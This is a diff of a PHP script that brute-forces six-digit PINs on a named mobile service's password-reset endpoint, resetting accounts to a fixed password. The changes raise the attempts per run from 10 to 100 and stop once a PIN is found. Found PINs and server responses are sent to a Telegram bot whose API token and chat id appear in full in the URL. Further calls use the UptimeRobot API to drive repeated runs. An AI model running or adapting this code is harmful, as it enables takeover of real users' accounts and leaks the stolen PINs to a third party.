@@ -1,5 +1,5 @@
 <?php
-
+$ne=100;
 header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
 header("Expires: Mon, 26 Jul 1997 00:00:00 GMT");
 header("Pragma: no-cache");
@@ -39,13 +39,15 @@ if($status=="0"){
 echo "stat 0";
 }else if($status=="1"){
 curl_setopt($ch,CURLOPT_POST,1);
-for($i=0;$i<10;$i++){
+for($i=0;$i<$ne;$i++){
 //echo "activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997";
 curl_setopt($ch,CURLOPT_POSTFIELDS,"activeToken=$token&pinNo=".sprintf("%06d",($pass+$i))."&newPassword=Don@1997");
 curl_setopt($ch,CURLOPT_URL,"https://openhouse.imimobile.com/ohindia/updatePinPassword.htm");
 $cnt=curl_exec($ch);
+$change="0";
 
 if(strpos($cnt,'"status":"success"')!==false){
+	
 $found=sprintf("%06d",($pass+$i));
 curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
 $pst='{"_id":"'.$token.'","found":"'.sprintf("%06d",($pass+$i)).'"}';
@@ -60,8 +62,10 @@ curl_exec($ch);
 curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
 curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=".($pass+$i));
 curl_exec($ch);
+break;
 
 }else if(strpos($cnt,"expired")!==false){
+	
 $found=sprintf("%06d",($pass+$i));
 curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/json','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
 $pst='{"_id":"'.$token.'","found":"expired '.sprintf("%06d",($pass+$i)).'"}';
@@ -72,12 +76,16 @@ curl_exec($ch);
 curl_setopt($ch,CURLOPT_HTTPHEADER,array('Content-Type: application/x-www-form-urlencoded','Accept-Encoding: gzip','Accept-Charset: ISO-8859-1,UTF-8;q=0.7,*;q=0.7','Cache-Control: no-cache','Accept-Language: de,en;q=0.7,en-us;q=0.3','Connection: close'));
 curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeEiDkwUbuxZgpUedAOHMTD_k/sendMessage?chat_id=536224432&text=$cnt");
 curl_exec($ch);
+break;
+
+}else if(strpos($cnt,"Invalid pin details")!==false){
+	$change="1";
 }
 
 }//for
 
-if($found=="0"){
-if(sprintf("%06d",($pass+10))>($_GET['id']*1000)){
+if($found=="0" && $change=="1"){
+if(sprintf("%06d",($pass+$ne))>($_GET['id']*1000)){
 $curl = curl_init();
 curl_setopt_array($curl, array(
   CURLOPT_URL => "https://api.uptimerobot.com/v2/deleteMonitor",CURLOPT_RETURNTRANSFER => true,CURLOPT_ENCODING => "",CURLOPT_MAXREDIRS => 10,CURLOPT_TIMEOUT => 30,CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,CURLOPT_CUSTOMREQUEST => "POST",
@@ -133,7 +141,7 @@ curl_setopt($ch,CURLOPT_URL,"https://api.telegram.org/bot523151186:AAH0_tWneKWeE
 
 }else{
 //without id
-echo "Token : ".$token."<br>found : ".$found;
+echo "token : ".$token."<br>found : ".$found;
 }
 
 curl_close($ch);
